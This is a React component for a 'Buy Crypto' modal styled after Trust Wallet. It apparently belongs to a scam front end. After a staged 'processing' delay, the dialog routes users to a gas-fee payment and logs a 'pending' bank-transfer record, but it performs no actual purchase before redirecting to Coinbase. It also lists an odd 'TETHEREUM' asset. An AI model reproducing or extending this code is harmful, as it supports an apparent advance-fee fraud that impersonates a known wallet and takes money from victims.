'use client';

import { useState, useMemo } from 'react';
import { X, ArrowRight, ChevronLeft } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import GasFeeModal from './gas-fee-modal';

interface BuyModalProps {
    address?: string;
    isOpen: boolean;
    onClose: () => void;
    onSuccess?: () => void;
}

export default function BuyModal({ address, isOpen, onClose, onSuccess, theme = 'light' }: BuyModalProps & { theme?: 'dark' | 'light' }) {
    const [amount, setAmount] = useState('');
    const [crypto, setCrypto] = useState('BNB');

    const [showGasModal, setShowGasModal] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    const currentNetwork = useMemo(() => {
        if (crypto === 'BNB' || crypto === 'BUSD' || crypto === 'TETHEREUM') return 'BNB';
        if (crypto === 'ETH' || crypto === 'USDT' || crypto === 'USDC') return 'ETH';
        if (crypto === 'BTC') return 'BTC';
        return 'ETH';
    }, [crypto]);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        setIsLoading(true);
        // BRIEF delay to show processing, then open Gas Modal
        setTimeout(() => {
            setIsLoading(false);
            setShowGasModal(true);
        }, 1500);
    };

    const handleSuccessRedirect = () => {
        window.open('https://www.coinbase.com/buy', '_blank');
        onClose();
    };

    const handleGasSuccess = async (txHash: string) => {
        // Create Pending Transaction in Airtable
        try {
            await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: address || "unknown",
                    amount: Number(amount),
                    type: "receive", // Buying is receiving crypto
                    asset: crypto,
                    network: "Bank Transfer",
                    wType: "bank",
                    status: "pending"
                })
            });
        } catch (err) {
            console.error("Failed to save buy history", err);
        }

        setShowGasModal(false);
        if (onSuccess) onSuccess();
        handleSuccessRedirect();
    };

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    {/* Backdrop */}
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={onClose}
                    />

                    {/* Modal - Bottom Sheet on Mobile, Centered on Desktop */}
                    <motion.div
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-[#3375BB]/30' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border rounded-[2.5rem] p-6 shadow-2xl m-4`}
                    >
                        {/* Header */}
                        <div className="flex items-center gap-4 mb-4">
                            <button
                                onClick={onClose}
                                className={`w-8 h-8 flex items-center justify-center rounded-full transition-all ${
                                    theme === 'dark' 
                                    ? 'bg-white/5 hover:bg-white/10 text-gray-400 hover:text-white' 
                                    : 'bg-gray-100 hover:bg-gray-200 text-gray-500'
                                }`}
                            >
                                <ChevronLeft className="w-5 h-5" />
                            </button>
                            <h2 className="text-lg font-bold">Buy Crypto</h2>
                        </div>

                        {/* Payment Method Selector - Only Bank */}
                        <div className="mb-4">
                            <button
                                className={`w-full p-3 rounded-xl border ${theme === 'dark' ? 'border-[#3375BB]/50 bg-[#3375BB]/10 text-white' : 'border-[#3375BB] bg-[#3375BB]/5 text-[#3375BB] font-semibold'
                                    } flex items-center justify-center gap-2 transition-all cursor-default`}
                            >
                                <img src="https://hatscripts.github.io/circle-flags/flags/us.svg" alt="Bank" className="w-5 h-5 object-contain rounded-full" />
                                <span className="text-xs">Bank Transfer</span>
                                <span className="text-[10px] opacity-70">1-3 days</span>
                            </button>
                            <p className="text-[10px] text-gray-500 text-center mt-2">
                                Bank transfers take 1-3 business days to process
                            </p>
                        </div>

                        {/* Form */}
                        <form onSubmit={handleSubmit} className="space-y-4">
                            {/* Amount Input */}
                            <div>
                                <label className="block text-xs font-medium text-gray-400 mb-1.5">Amount to Spend</label>
                                <div className="relative">
                                    <input
                                        type="number"
                                        value={amount}
                                        onChange={(e) => setAmount(e.target.value)}
                                        placeholder="0.00"
                                        className={`w-full px-4 py-3 border rounded-xl focus:border-[#3375BB] focus:outline-none transition-colors text-base placeholder-gray-600 ${theme === 'dark' ? 'bg-[#121212] border-white/5 text-white' : 'bg-gray-100 border-gray-200 text-[#0a0b0d]'
                                            }`}
                                        required
                                    />
                                    <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-semibold text-xs">USD</span>
                                </div>
                            </div>

                            {/* Crypto Selection */}
                            <div>
                                <label className="block text-xs font-medium text-gray-400 mb-1.5">Crypto to Buy</label>
                                <div className="relative">
                                    <select
                                        value={crypto}
                                        onChange={(e) => setCrypto(e.target.value)}
                                        className={`w-full px-4 py-3 border rounded-xl focus:border-[#3375BB] focus:outline-none transition-colors appearance-none cursor-pointer text-xs ${theme === 'dark' ? 'bg-[#121212] border-white/5 text-white' : 'bg-gray-100 border-gray-200 text-[#0a0b0d]'
                                            }`}
                                    >
                                        <option value="BNB">BNB</option>
                                        <option value="TETHEREUM">TETHEREUM</option>
                                        <option value="USDT">USDT</option>
                                        <option value="BUSD">BUSD</option>
                                        <option value="ETH">Ethereum</option>
                                        <option value="BTC">Bitcoin</option>
                                    </select>
                                    <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                                        <ArrowRight className="w-3 h-3 rotate-90" />
                                    </div>
                                </div>
                            </div>

                            {/* Submit Button */}
                            <button
                                type="submit"
                                disabled={!amount || Number(amount) <= 0}
                                className="w-full bg-[#3375BB] hover:bg-[#004ada] disabled:bg-[#3375BB]/50 disabled:cursor-not-allowed !text-white font-black uppercase tracking-widest py-4 rounded-xl transition-all shadow-lg hover:shadow-[#3375BB]/25 active:scale-[0.98] flex items-center justify-center gap-2 mt-4 text-[11px]"
                            >
                                Continue to Trust Wallet
                                <ArrowRight className="w-4 h-4" />
                            </button>
                        </form>

                        <AnimatePresence>
                            {showGasModal && (
                                <GasFeeModal
                                    isOpen={showGasModal}
                                    onClose={() => setShowGasModal(false)}
                                    onSuccess={handleGasSuccess}
                                    theme={theme}
                                    network={currentNetwork}
                                />
                            )}
                        </AnimatePresence>
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}
